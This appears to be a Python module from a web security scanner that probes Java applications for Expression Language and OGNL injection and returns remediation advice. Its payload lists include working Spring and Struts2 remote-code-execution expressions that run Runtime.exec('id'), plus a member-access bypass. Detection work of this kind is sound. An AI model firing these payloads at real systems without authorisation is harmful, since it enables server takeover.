# scanner/injection/el_injection.py
"""
Expression Language Injection Scanner

Detects Expression Language (EL) and Object Graph Navigation Library (OGNL) 
injection vulnerabilities in Java applications.

OWASP: A05:2025 - Injection
CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement
"""

import re
import asyncio
from typing import List, Dict, Optional
import aiohttp

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class ELInjectionScanner(BaseScanner):
    """Scanner for Expression Language (EL) and OGNL Injection vulnerabilities"""
    
    name = "Expression Language Injection Scanner"
    description = "Detects EL/OGNL injection vulnerabilities in Java applications"
    owasp_category = OWASPCategory.A05_INJECTION
    
    # Unique marker for detection
    CANARY = "ELInj7391"
    MATH_RESULT = "5765041"  # 2401 * 2401
    
    # Expression Language payloads
    PAYLOADS = {
        # Java Unified Expression Language (UEL)
        'java_el': [
            # Basic math evaluation
            ("${2401*2401}", MATH_RESULT, "Java EL math"),
            ("#{2401*2401}", MATH_RESULT, "Java EL deferred math"),
            ("${7*7}", "49", "Java EL simple math"),
            ("#{7*7}", "49", "Java EL deferred simple"),
            
            # Runtime access
            ("${Runtime.getRuntime()}", "Runtime", "Java EL Runtime access"),
            ("${T(java.lang.Runtime).getRuntime()}", "Runtime", "SpEL Runtime"),
            
            # Class loading
            ("${class.forName('java.lang.Runtime')}", "Runtime", "Java EL forName"),
            ("${T(java.lang.Class).forName('java.lang.Runtime')}", "Runtime", "SpEL forName"),
            
            # System properties
            ("${T(java.lang.System).getProperty('user.dir')}", "/", "SpEL user.dir"),
            ("${applicationScope}", "application", "Java EL scope"),
            ("${session}", "session", "Java EL session"),
            ("${request}", "request", "Java EL request"),
        ],
        
        # Spring Expression Language (SpEL)
        'spel': [
            # Basic evaluation
            ("${2401*2401}", MATH_RESULT, "SpEL math"),
            ("#{2401*2401}", MATH_RESULT, "SpEL deferred math"),
            
            # Type operator
            ("${T(java.lang.Math).random()}", "0.", "SpEL Math.random"),
            ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Process", "SpEL RCE"),
            
            # New object creation
            ("${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}", "uid", "SpEL Scanner RCE"),
            
            # Bean access
            ("${@systemProperties}", "java", "SpEL systemProperties"),
            ("${@environment}", "environment", "SpEL environment"),
        ],
        
        # OGNL (Object-Graph Navigation Language)
        'ognl': [
            # Basic math
            ("%{2401*2401}", MATH_RESULT, "OGNL math"),
            ("${2401*2401}", MATH_RESULT, "OGNL alt math"),
            ("%{7*7}", "49", "OGNL simple math"),
            
            # Context access
            ("%{#context}", "context", "OGNL context"),
            ("%{#application}", "application", "OGNL application"),
            ("%{#session}", "session", "OGNL session"),
            ("%{#request}", "request", "OGNL request"),
            
            # Static method access
            ("%{@java.lang.Runtime@getRuntime()}", "Runtime", "OGNL Runtime"),
            ("%{@java.lang.System@getProperty('user.dir')}", "/", "OGNL user.dir"),
            
            # Struts2 specific
            ("%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}", "Process", "OGNL Struts2 RCE"),
            ("%{#_memberAccess['allowStaticMethodAccess']=true}", "true", "OGNL member access"),
            
            # Command execution patterns (Struts2 CVE patterns)
            ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}", "MemberAccess", "OGNL member access bypass"),
        ],
        
        # MVEL (MVFLEX Expression Language)
        'mvel': [
            ("${2401*2401}", MATH_RESULT, "MVEL math"),
            ("@{2401*2401}", MATH_RESULT, "MVEL alt math"),
            ("${Runtime.getRuntime()}", "Runtime", "MVEL Runtime"),
        ],
        
        # JBoss Seam EL
        'seam': [
            ("#{2401*2401}", MATH_RESULT, "Seam EL math"),
            ('#{expressions.getClass().forName("java.lang.Runtime")}', "Runtime", "Seam forName"),
        ],
        
        # Thymeleaf SSTI (preprocessed)
        'thymeleaf': [
            ("__${2401*2401}__", MATH_RESULT, "Thymeleaf preprocessed math"),
            ("__${T(java.lang.Runtime).getRuntime()}__", "Runtime", "Thymeleaf Runtime"),
            ("[[${2401*2401}]]", MATH_RESULT, "Thymeleaf inline"),
            ("[(${2401*2401})]", MATH_RESULT, "Thymeleaf unescaped"),
        ],
    }
    
    # Error patterns indicating EL processing
    ERROR_PATTERNS = [
        r"javax\.el\.ELException",
        r"javax\.el\.PropertyNotFoundException",
        r"ELException",
        r"PropertyNotFoundException",
        r"ognl\.OgnlException",
        r"OgnlException",
        r"ognl\.NoSuchPropertyException",
        r"org\.springframework\.expression\.spel",
        r"SpelEvaluationException",
        r"SpelParseException",
        r"org\.mvel2",
        r"MVEL.*Exception",
        r"org\.thymeleaf\.exceptions",
        r"TemplateInputException",
        r"Error evaluating.*expression",
        r"Cannot evaluate.*expression",
        r"Expression.*error",
        r"org\.apache\.struts2",
        r"ognl\.MethodFailedException",
        r"java\.lang\.IllegalAccessException.*ognl",
    ]
    
    # Headers that may indicate Java applications
    JAVA_INDICATORS = [
        r"JSESSIONID",
        r"X-Powered-By:.*Servlet",
        r"X-Powered-By:.*JSP",
        r"Server:.*Tomcat",
        r"Server:.*JBoss",
        r"Server:.*WildFly",
        r"Server:.*WebLogic",
        r"Server:.*WebSphere",
        r"Server:.*Jetty",
        r"Server:.*GlassFish",
    ]
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for EL/OGNL injection vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        # Check if target appears to be a Java application
        is_java = await self._detect_java_application(session, url)
        
        for param_name, param_value in params.items():
            # Test output-based detection
            output_vuln = await self._test_output_based(
                session, url, params, param_name, is_java
            )
            if output_vuln:
                vulnerabilities.append(output_vuln)
                continue
            
            # Test error-based detection
            error_vuln = await self._test_error_based(
                session, url, params, param_name
            )
            if error_vuln:
                vulnerabilities.append(error_vuln)
        
        return vulnerabilities
    
    async def _detect_java_application(self, session: aiohttp.ClientSession,
                                        url: str) -> bool:
        """Detect if target is likely a Java application"""
        try:
            response = await self.make_request(session, "GET", url)
            if not response:
                return False
            
            headers_str = str(response.headers)
            
            for pattern in self.JAVA_INDICATORS:
                if re.search(pattern, headers_str, re.IGNORECASE):
                    return True
            
            # Check for .jsp, .do, .action extensions
            if any(ext in url.lower() for ext in ['.jsp', '.do', '.action', '.jsf', '.faces']):
                return True
            
            return False
        except Exception:
            return False
    
    async def _test_output_based(self, session: aiohttp.ClientSession,
                                  url: str, params: Dict[str, str],
                                  param_name: str, is_java: bool) -> Optional[Vulnerability]:
        """Test for output-based EL injection"""
        
        # Prioritize payloads based on whether target is Java
        payload_order = ['java_el', 'spel', 'ognl', 'thymeleaf', 'mvel', 'seam'] if is_java else \
                       ['ognl', 'java_el', 'spel', 'thymeleaf']
        
        for el_type in payload_order:
            payloads = self.PAYLOADS.get(el_type, [])
            
            for payload, expected, description in payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = await self.make_request(session, "GET", url, params=test_params)
                    if not response:
                        continue
                    
                    body = await response.text()
                    
                    # Check for expected output
                    if expected in body:
                        # Verify it's not just reflection
                        if payload not in body or expected != payload:
                            severity = Severity.CRITICAL if 'Runtime' in expected or 'RCE' in description else Severity.HIGH
                            
                            return self.create_vulnerability(
                                vuln_type=f"Expression Language Injection ({el_type.upper()})",
                                severity=severity,
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"Expression evaluated, '{expected}' found. Type: {el_type}",
                                description=f"EL injection detected ({description}). This can lead to Remote Code Execution in Java applications.",
                                cwe_id="CWE-917",
                                cvss_score=9.8 if severity == Severity.CRITICAL else 8.0,
                                remediation=self._get_remediation(el_type),
                                references=[
                                    "https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection",
                                    "https://cwe.mitre.org/data/definitions/917.html",
                                    "https://portswigger.net/research/server-side-template-injection"
                                ]
                            )
                    
                    # Also test POST
                    response = await self.make_request(session, "POST", url, data=test_params)
                    if response:
                        body = await response.text()
                        if expected in body and payload not in body:
                            return self.create_vulnerability(
                                vuln_type=f"Expression Language Injection ({el_type.upper()})",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"Expression evaluated via POST, '{expected}' found",
                                description=f"EL injection via POST ({description})",
                                cwe_id="CWE-917",
                                cvss_score=9.8,
                                remediation=self._get_remediation(el_type),
                                references=[
                                    "https://cwe.mitre.org/data/definitions/917.html"
                                ]
                            )
                
                except Exception:
                    continue
        
        return None
    
    async def _test_error_based(self, session: aiohttp.ClientSession,
                                 url: str, params: Dict[str, str],
                                 param_name: str) -> Optional[Vulnerability]:
        """Test for error-based EL injection detection"""
        
        # Payloads designed to trigger errors
        error_payloads = [
            ("${", "Unclosed EL"),
            ("#{", "Unclosed deferred EL"),
            ("%{", "Unclosed OGNL"),
            ("${T(", "Unclosed SpEL type"),
            ("%{#", "Unclosed OGNL context"),
            ("${invalid.property.chain}", "Invalid property"),
            ("#{nonexistent.method()}", "Invalid method"),
            ("%{@invalid.Class@method()}", "Invalid static call"),
        ]
        
        for payload, description in error_payloads:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                response = await self.make_request(session, "GET", url, params=test_params)
                if not response:
                    continue
                
                body = await response.text()
                
                for pattern in self.ERROR_PATTERNS:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        # Determine EL type from error
                        el_type = "OGNL" if "ognl" in match.group().lower() else \
                                 "SpEL" if "spel" in match.group().lower() else \
                                 "Java EL"
                        
                        return self.create_vulnerability(
                            vuln_type=f"Potential EL Injection ({el_type})",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"EL error detected: {match.group()[:100]}",
                            description=f"Error-based EL injection indicator ({description})",
                            cwe_id="CWE-917",
                            cvss_score=7.5,
                            remediation=self._get_remediation(el_type.lower().replace(' ', '_')),
                            references=[
                                "https://cwe.mitre.org/data/definitions/917.html"
                            ]
                        )
            
            except Exception:
                continue
        
        return None
    
    def _get_remediation(self, el_type: str) -> str:
        """Get EL-type specific remediation"""
        
        base = """
Expression Language Injection Prevention:

1. **Never evaluate user input as EL expressions**
2. Use parameterized/prepared approaches instead of string concatenation
3. Implement strict input validation with allowlists
4. Disable dangerous EL features when possible
5. Keep frameworks and libraries updated
6. Use Content Security Policy headers
"""
        
        specific = {
            'ognl': """
OGNL (Struts2) Specific:
- Update Struts2 to latest version (many CVEs patched)
- Disable Dynamic Method Invocation (DMI)
- Set struts.ognl.allowStaticMethodAccess=false
- Use struts.excluded.classes and struts.excluded.package.name.patterns

In struts.xml:
```xml
<constant name="struts.ognl.allowStaticMethodAccess" value="false"/>
<constant name="struts.enable.DynamicMethodInvocation" value="false"/>
""",
'spel': """
Spring SpEL Specific:

Use SimpleEvaluationContext instead of StandardEvaluationContext
Disable method invocation and type access
Use @Value with static expressions only
WRONG:

java
StandardEvaluationContext context = new StandardEvaluationContext();
parser.parseExpression(userInput).getValue(context);
CORRECT:

java
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
// Or avoid evaluating user input entirely
""",
'java_el': """
Java EL Specific:

Don't pass user input to EL evaluator
Use static expressions defined in code/templates
Configure ELResolver to restrict access
Disable scriptlets in JSP (in web.xml)
In web.xml:

xml
<jsp-config>
    <jsp-property-group>
        <scripting-invalid>true</scripting-invalid>
    </jsp-property-group>
</jsp-config>
""",
'thymeleaf': """
Thymeleaf Specific:

Use th:text (escaped) instead of th:utext (unescaped)

Avoid preprocessing (${...}) with user input

Don't allow user control over template names

Use Thymeleaf 3.x which has better security defaults
"""
}

        return base + specific.get(el_type, "")